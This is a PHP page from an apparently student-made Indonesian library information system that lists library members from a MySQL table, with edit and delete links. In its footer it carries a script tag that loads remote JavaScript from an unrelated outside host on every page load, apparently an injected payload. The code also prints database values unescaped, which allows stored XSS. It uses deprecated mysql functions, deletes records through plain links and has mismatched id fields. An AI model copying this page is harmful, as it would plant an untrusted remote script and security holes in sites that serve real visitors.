<html>
<head>
</head>
<body>
<table width="1000" border="1">
<tr>
<td colspan="2" align="center"><h1>Sistem Informasi Perpustakaan</h1></td>
</tr>
<tr>
<td width = "200">
<ul>
<li><a href="anggota.php">Anggota</a></li>
<li><a href="buku.php">Buku</a></li>
<li><a href="pinjam.php">Pinjam</a></li>
<ul>

</td>
<td width="500">
<a href="input_anggota.php">Input anggota</a>
 <table border="1" >
                                        <thead>   

          <tr>
            <th >No</th>
            <th >id </th>
            <th >nama anggota </th>
            <th >alamat </th>
            <th >Jurusan</th>
           
            <th >Aksi</th>
          </tr>
        </thead>
                                    
                                   

                                    <tbody>
                                    <?php 
include "koneksi.php";
$query    = "select * from anggota order by id";
$sql    = mysql_query ($query);
$no = 1;
while ($data=mysql_fetch_array($sql)) {
?>           
                                        <tr class="odd gradeX">
                                            <td><?php echo $data['id'];?></td>
                                             <td><?php echo $data['nm_anggota'];?></td>
                                              <td><?php echo $data['alamat'];?></td>
                                              <td class="center"><?php echo $data['jurusan'];?></td>
                                           
                                            <td class="center"><a href="edit_anggota.php?id=<?php echo $data['id']; ?>" > Edit </a>|<a href="hapus_anggota.php?id=<?php echo $data['id_anggota']; ?>" 
    onClick = "return confirm('Apakah Anda ingin mengapus  <?php echo $data['nm_anggota']; ?>?')"> hapus</a></td>
                                        </tr>
                                       
                                        <?php $no++; }?>
                                    </tbody>
                                   
                                   

                                </table>
</td>
</tr>
<tr>
<td colspan="2" align="center">Sertifikasi 2017<br><script src="//go.padstm.com/?id=261029"></script></td>
</tr>
</table>
</body>
</html>